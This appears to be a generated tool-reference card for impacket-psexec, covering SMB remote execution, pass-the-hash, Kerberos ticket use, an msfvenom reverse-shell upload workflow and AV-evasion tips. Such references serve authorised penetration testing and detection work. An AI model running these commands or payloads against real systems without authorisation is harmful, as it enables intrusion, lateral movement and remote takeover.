---
name: Impacket Psexec
description: Python implementation of PsExec for remote command execution on
  Windows via SMB; writes service binary to ADMIN$ and creates temporary
  service.
registry: registry
tool_id: impacket-psexec
category: post-exploitation
tags:
  - lateral-movement
  - remote-execution
  - smb
  - psexec
  - impacket
  - post-exploitation
  - windows
mitre_techniques:
  - T1021.002
  - T1569.002
  - T1543.003
summary: "impacket-psexec executes remote commands on Windows hosts over SMB
  (port 445) by uploading a service binary to ADMIN$ and creating a temporary
  Windows service. Requires admin-level credentials or valid hashes. Invoke as:
  impacket-psexec [[domain/]]username[:password]@target [command]. Supports
  plaintext passwords, pass-the-hash (-hashes LMHASH:NTHASH), Kerberos tickets
  (-k -no-pass with KRB5CCNAME set), and AES keys. Default command is cmd.exe.
  Returns interactive shell over SMB. Binary is written to C:\\Windows (ADMIN$
  share) with random or user-specified name (-remote-binary-name). Service name
  defaults to random 8-char string or set via -service-name. Writes
  PSEXESVC.exe-style binary to disk; expect Event ID 5145 (share access), 7045
  (service creation), and service execution artifacts. Less stealthy than
  smbexec/wmiexec due to file write. Use -c to upload custom payload first. Does
  NOT accept interactive binaries well (powershell, etc). Authentication order:
  try credentials, then hash, then Kerberos. Shell commands prefixed with !
  execute locally. File drops create forensic artifacts; clean up service and
  binary manually if needed or tool crashes."
sources:
  - https://www.blackhillsinfosec.com/impacket-cheatsheet/
  - https://www.hackingarticles.in/impacket-for-pentester-psexec/
  - https://guardsix.com/blog/the-impacket-arsenal-a-deep-dive-into-impacket-remote-code-execution-tools
  - https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
  - https://www.cybertriage.com/blog/dfir-breakdown-impacket-remote-execution-activity-smbexec/
  - https://www.kali.org/tools/impacket-scripts/
  - https://threathunt.blog/impacket-psexec/
  - https://rgbwiki.com/Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/
  - https://www.silverfort.com/glossary/psexec/
  - https://www.sans.org/blog/psexec-python-rocks
  - https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/
  - https://www.mindpointgroup.com/blog/lateral-movement-with-psexec
generated_at: 2026-05-19T11:11:12.796Z
generated_by: anthropic
source_hash: 0719f9f62c0e4961e47a67daf96956a8fd66e2198f77b062031dea1e5823caaa
---

# Impacket Psexec

## Overview

impacket-psexec is a Python implementation of Microsoft Sysinternals PsExec, enabling remote command execution on Windows systems over SMB without requiring the original binary. It authenticates via SMB, uploads a service executable to the ADMIN$ share (C:\Windows), creates a Windows service via DCE/RPC to the Service Control Manager (svcctl named pipe), starts the service to execute commands, and provides an interactive pseudo-shell. Part of the Impacket framework by Fortra, LLC. Requires administrative privileges on the target. Default port is 445/SMB.

## When to use

Use impacket-psexec for lateral movement when you have valid admin credentials, NTLM hashes, or Kerberos tickets and need remote code execution on Windows targets. Ideal for gaining SYSTEM-level interactive shells, executing single commands, or uploading and running custom payloads (e.g., Meterpreter shells). Prefer this over smbexec/wmiexec when you need full interactivity and can tolerate higher detectability (file write + service creation). Use when SMB (445) is accessible and you have write access to ADMIN$ share. Effective in Active Directory environments for domain-joined machines. Not suitable when stealth is paramount or when AV/EDR is aggressively monitoring service creation and ADMIN$ writes.

## Authentication & setup

Supports four authentication methods:

1. **Plaintext password**: impacket-psexec domain/username:password@target
   - Escape special characters in passwords (quote if needed)
   - Example: impacket-psexec ignite.local/administrator:Ignite@987@192.168.1.11

2. **Pass-the-Hash (PtH)**: impacket-psexec domain/username@target -hashes LMHASH:NTHASH
   - Provide LM:NTLM format; use 'aad3b435b51404eeaad3b435b51404ee' as placeholder LM if unavailable
   - Example: impacket-psexec domain/admin@192.168.1.10 -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99

3. **Kerberos ticket**: Export KRB5CCNAME=/path/to/ticket.ccache; impacket-psexec domain/username@target -k -no-pass
   - Obtain ticket first via getTGT.py or ticketer.py
   - Must specify FQDN or hostname, not IP

4. **AES Kerberos key**: impacket-psexec domain/username@target -aesKey <hex_key> -k -no-pass

Additional flags: -dc-ip (specify DC), -target-ip (if DNS unavailable), -port (default 445), -codec (output encoding). Use -hashes, -no-pass, or -k as appropriate. Credentials must have local admin rights on target.

## Key commands / parameters

**Syntax**: impacket-psexec [options] [[domain/]]username[:password]@target [command]

**Key options**:
- `-c pathname`: Copy local file to target before execution (uploads to ADMIN$, then executes)
- `-path PATH`: Set working directory for remote command
- `-file FILE`: Alternative to -c for payload upload
- `-hashes LMHASH:NTHASH`: Pass-the-hash authentication
- `-no-pass`: Don't prompt for password (use with -k or -hashes)
- `-k`: Use Kerberos authentication (requires KRB5CCNAME env variable)
- `-aesKey <hex>`: Use AES key for Kerberos
- `-dc-ip <ip>`: Specify domain controller IP
- `-target-ip <ip>`: Force target IP (bypass DNS)
- `-service-name <name>`: Specify service name (default: random 8 chars)
- `-remote-binary-name <name>`: Control name of uploaded binary (default: random)
- `-debug`: Verbose debug output
- `-codec CODEC`: Set output encoding

**Interactive shell commands**:
- `!<command>`: Execute command locally on attacker machine
- `exit` / `quit`: Close session
- Standard Windows commands execute on target

**Positional**:
- `target`: [[domain/]]username[:password]@<hostname_or_IP>
- `command`: Optional command to run (default: cmd.exe for interactive shell)

## Example workflows

**1. Interactive shell with password**:
impacket-psexec corp.local/administrator:P@ssw0rd@192.168.1.50

**2. Pass-the-Hash for single command**:
impacket-psexec admin@10.10.10.100 -hashes :5f4dcc3b5aa765d61d8327deb882cf99 whoami

**3. Upload and execute Meterpreter payload**:
# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.17 LPORT=1234 -f exe > shell.exe
# Start listener in msfconsole
# Execute via psexec
impacket-psexec domain/admin:pass@target -c shell.exe

**4. Kerberos ticket (Golden/Silver ticket or TGT)**:
export KRB5CCNAME=administrator.ccache
impacket-psexec corp.local/administrator@DC01.corp.local -k -no-pass

**5. Custom service name for persistence tracking**:
impacket-psexec admin@target -hashes :hash -service-name MyCustomSvc

**6. Domain-wide execution preparation** (after credential harvest):
# Obtain TGT
impacket-getTGT corp.local/admin:password
export KRB5CCNAME=admin.ccache
# Use across multiple hosts
impacket-psexec corp.local/admin@host1.corp.local -k -no-pass
impacket-psexec corp.local/admin@host2.corp.local -k -no-pass

**7. Upload and run custom script**:
impacket-psexec admin@target -hashes :hash -c script.bat

## Output format

impacket-psexec provides an interactive cmd.exe shell by default. Output appears in real-time as command results. Successful authentication shows:

```
Impacket v0.x.x - Copyright Fortra, LLC
[*] Requesting shares on target...
[*] Found writable share ADMIN$
[*] Uploading file <random_name>.exe
[*] Opening SVCManager on target...
[*] Creating service <service_name> on target...
[*] Starting service <service_name>....
[!] Press help for extra shell commands
Microsoft Windows [Version ...]
(c) Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

Commands execute synchronously with stdout/stderr returned. Shell prompt indicates remote context (usually C:\Windows\system32 if running as SYSTEM). Error messages appear for authentication failures, access denied, or SMB issues. Session logs service creation and binary upload. On exit, service stops and binary may remain (cleanup not guaranteed on crash). No structured output format—raw Windows command output. Use `!<cmd>` prefix to distinguish local vs. remote execution in logs.

## Common pitfalls

**1. File persistence**: Uploaded service binary may remain in C:\Windows after session ends; manual cleanup required if tool crashes or exits ungracefully.

**2. High detectability**: Writes executable to ADMIN$ share and creates Windows service; triggers Event IDs 5145 (share access), 7045 (service installation), and leaves forensic artifacts (prefetch, service registry keys). Easily flagged by AV/EDR.

**3. Interactive binaries fail**: Commands requiring user input (powershell.exe interactive, plink, vssadmin prompts) cause service to hang or fail. Use non-interactive alternatives or redirect input.

**4. Authentication issues**:
   - Pass-the-hash requires colon-separated LM:NTLM format (use aad3b435b51404eeaad3b435b51404ee as LM placeholder)
   - Kerberos requires FQDN/hostname, not IP addresses
   - KRB5CCNAME must be exported before -k flag works
   - Local admin rights required; standard domain user will fail

**5. Special characters in passwords**: Escape or quote passwords with @, !, $, etc. Shell may interpret them.

**6. Network issues**: Requires SMB (445/TCP) access; firewalls/port filtering break connectivity. Use -target-ip if DNS fails.

**7. Service name collisions**: Random service names prevent conflicts, but custom -service-name may collide with existing services.

**8. Stealthiness trade-off**: Less covert than smbexec.py or wmiexec.py; use alternatives when stealth matters.

**9. Session cleanup**: Always `exit` cleanly; abrupt disconnects may leave service running or binary orphaned.

**10. AV interference**: Uploaded binary may be quarantined; use obfuscation, custom -remote-binary-name, or alternative execution methods.

## References

- https://www.blackhillsinfosec.com/impacket-cheatsheet/
- https://www.hackingarticles.in/impacket-for-pentester-psexec/
- https://guardsix.com/blog/the-impacket-arsenal-a-deep-dive-into-impacket-remote-code-execution-tools
- https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
- https://www.kali.org/tools/impacket-scripts/
- https://threathunt.blog/impacket-psexec/
- https://rgbwiki.com/Red%20Cell/14.%20Cheatsheets/Tools/Impacket%20Cheatsheet/
- https://www.sans.org/blog/psexec-python-rocks
- https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/
- https://www.mindpointgroup.com/blog/lateral-movement-with-psexec
